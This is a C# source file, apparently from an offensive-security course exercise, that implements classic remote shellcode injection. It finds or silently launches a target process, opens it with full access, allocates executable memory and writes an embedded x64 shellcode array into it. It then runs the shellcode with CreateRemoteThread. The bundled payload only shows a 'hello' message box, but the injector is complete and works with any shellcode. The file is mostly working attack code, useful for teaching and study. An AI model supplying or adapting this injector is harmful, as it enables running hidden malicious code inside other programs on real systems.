using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

// Base code taken from Exercise 2, refer there if anything is unclear

namespace Injector
{
    public class BasicShellcodeInjector
    {


        [Flags]
        public enum ProcessAccessFlags : uint
        {
            All = 0x001F0FFF
        }
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr OpenProcess(ProcessAccessFlags processAccess, bool bInheritHandle, int processId);


        [Flags]
        public enum AllocationType
        {
            Commit = 0x1000,
            Reserve = 0x2000
        }
        [Flags]
        public enum MemoryProtection
        {
            ExecuteReadWrite = 0x40
        }
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocEx(IntPtr procHandle, IntPtr lpAddress, uint dwSize, AllocationType flAllocationType, MemoryProtection flProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool WriteProcessMemory(IntPtr procHandle, IntPtr lpBaseAddress, byte[] lpscfer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateRemoteThread(IntPtr procHandle, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        public static void Main(string[] args) // We accept arguments here (as a string array)
        {
            //messagebox
            byte[] sc = new byte[297] {0xfc,0x48,0x81,0xe4,0xf0,0xff,
0xff,0xff,0xe8,0xcc,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,
0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,
0x48,0x8b,0x52,0x20,0x51,0x56,0x48,0x8b,0x72,0x50,0x48,0x0f,
0xb7,0x4a,0x4a,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x3c,0x61,
0x7c,0x02,0x2c,0x20,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0xe2,
0xed,0x52,0x48,0x8b,0x52,0x20,0x41,0x51,0x8b,0x42,0x3c,0x48,
0x01,0xd0,0x66,0x81,0x78,0x18,0x0b,0x02,0x0f,0x85,0x72,0x00,
0x00,0x00,0x8b,0x80,0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,
0x67,0x48,0x01,0xd0,0x50,0x8b,0x48,0x18,0x44,0x8b,0x40,0x20,
0x49,0x01,0xd0,0xe3,0x56,0x48,0xff,0xc9,0x41,0x8b,0x34,0x88,
0x4d,0x31,0xc9,0x48,0x01,0xd6,0x48,0x31,0xc0,0xac,0x41,0xc1,
0xc9,0x0d,0x41,0x01,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,
0x24,0x08,0x45,0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,
0x49,0x01,0xd0,0x66,0x41,0x8b,0x0c,0x48,0x44,0x8b,0x40,0x1c,
0x49,0x01,0xd0,0x41,0x8b,0x04,0x88,0x41,0x58,0x41,0x58,0x5e,
0x48,0x01,0xd0,0x59,0x5a,0x41,0x58,0x41,0x59,0x41,0x5a,0x48,
0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,
0x8b,0x12,0xe9,0x4b,0xff,0xff,0xff,0x5d,0xe8,0x0b,0x00,0x00,
0x00,0x75,0x73,0x65,0x72,0x33,0x32,0x2e,0x64,0x6c,0x6c,0x00,
0x59,0x41,0xba,0x4c,0x77,0x26,0x07,0xff,0xd5,0x49,0xc7,0xc1,
0x00,0x00,0x00,0x00,0xe8,0x06,0x00,0x00,0x00,0x68,0x65,0x6c,
0x6c,0x6f,0x00,0x5a,0xe8,0x06,0x00,0x00,0x00,0x68,0x65,0x6c,
0x6c,0x6f,0x00,0x41,0x58,0x48,0x31,0xc9,0x41,0xba,0x45,0x83,
0x56,0x07,0xff,0xd5,0x48,0x31,0xc9,0x41,0xba,0xf0,0xb5,0xa2,
0x56,0xff,0xd5};
            int len = sc.Length;

            // Argument parsing
            // Error if an incorrect number of arguments is passed
            if (!(args.Length == 1))
            {
                Console.WriteLine("Incorrect number of arguments.\nUsage: BasicShellcodeInjectorDynamicTarget.exe <target process>");
                return;
            }

            // Take the target proc from the first argument, stripping the '.exe' extension if defined
            string targetProc = args[0].Replace(".exe", string.Empty);
            int pid = 0;

            Process[] expProc = Process.GetProcessesByName(targetProc);
            if (expProc.Length == 0)
            {
                // Launch the target process and get its PID
                // As per the assignment, we assume it is in the windows PATH
                try
                {
                    var p = new Process();
                    p.StartInfo.FileName = $"{targetProc}.exe";
                    p.StartInfo.WindowStyle = ProcessWindowStyle.Hidden; // Hide the spawned window
                    p.Start();
                    pid = p.Id;
                }
                catch
                {
                    Console.WriteLine("Could not launch specified process.");
                    return;
                }
            }
            else
            {
                // The process is already running - just get its PID
                pid = expProc[0].Id;
            }

            Console.WriteLine($"Target process: {targetProc} [{pid}].");

            IntPtr procHandle = OpenProcess(ProcessAccessFlags.All, false, pid);
            if ((int)procHandle == 0)
            {
                Console.WriteLine($"Failed to get handle on PID {pid}. Do you have the right privileges?");
                return;
            }
            else
            {
                Console.WriteLine($"Got handle {procHandle} on target process.");
            }

            IntPtr memAddr = VirtualAllocEx(procHandle, IntPtr.Zero, (uint)len, AllocationType.Commit | AllocationType.Reserve,
                MemoryProtection.ExecuteReadWrite);
            Console.WriteLine($"Allocated memory in remote process.");

            IntPtr bytesWritten;
            bool procMemResult = WriteProcessMemory(procHandle, memAddr, sc, len, out bytesWritten);
            if (procMemResult)
            {
                Console.WriteLine($"Wrote {bytesWritten} bytes.");
            }
            else
            {
                Console.WriteLine("Failed to write to remote process.");
            }

            IntPtr tAddr = CreateRemoteThread(procHandle, IntPtr.Zero, 0, memAddr, IntPtr.Zero, 0, IntPtr.Zero);
            Console.WriteLine($"Created remote thread!");

        }
    }
}